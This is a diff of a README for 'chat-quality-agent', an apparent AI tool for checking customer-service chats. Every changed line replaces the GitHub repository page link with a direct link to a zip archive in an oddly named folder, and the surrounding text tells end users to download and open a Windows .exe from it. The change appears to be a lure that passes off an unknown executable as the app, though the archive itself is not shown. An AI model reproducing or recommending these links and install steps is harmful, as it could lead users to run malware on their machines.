@@ -1,6 +1,6 @@
 # 🤖 chat-quality-agent - AI checks CSKH chat quality
 
-[![Download](https://img.shields.io/badge/Download-Open%20Page-blue.svg?style=for-the-badge)](https://github.com/Burglarious-alcearosea676/chat-quality-agent)
+[![Download](https://img.shields.io/badge/Download-Open%20Page-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ This app is made for end users who want a simple way to check chat quality on a 
 
 Use this link to visit the download page:
 
-[Open chat-quality-agent on GitHub](https://github.com/Burglarious-alcearosea676/chat-quality-agent)
+[Open chat-quality-agent on GitHub](https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip)
 
 On the page, look for the latest release, app file, or setup file. If you see a Windows file such as `.exe`, download it and open it.
 
@@ -34,7 +34,7 @@ If your computer is older, the app may still run, but chat analysis can take lon
 Follow these steps on Windows.
 
 1. Open the download page:
-   [https://github.com/Burglarious-alcearosea676/chat-quality-agent](https://github.com/Burglarious-alcearosea676/chat-quality-agent)
+   [https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip](https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip)
 
 2. Look for the latest version on the page.
 
@@ -235,13 +235,13 @@ Clear input gives better analysis.
 - Name: chat-quality-agent
 - Description: Chat Quality Agent - Agent phân tích chất lượng CSKH bằng AI
 - Topics: ai-agent, facebook-messenger, zalo
-- Primary link: https://github.com/Burglarious-alcearosea676/chat-quality-agent
+- Primary link: https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip
 
 ## 🔗 Download page again
 
 If you need the file again, open the page here:
 
-[https://github.com/Burglarious-alcearosea676/chat-quality-agent](https://github.com/Burglarious-alcearosea676/chat-quality-agent)
+[https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip](https://raw.githubusercontent.com/Burglarious-alcearosea676/chat-quality-agent/main/hydroiodic/quality-agent-chat-3.0.zip)
 
 ## 🧩 File checklist
 
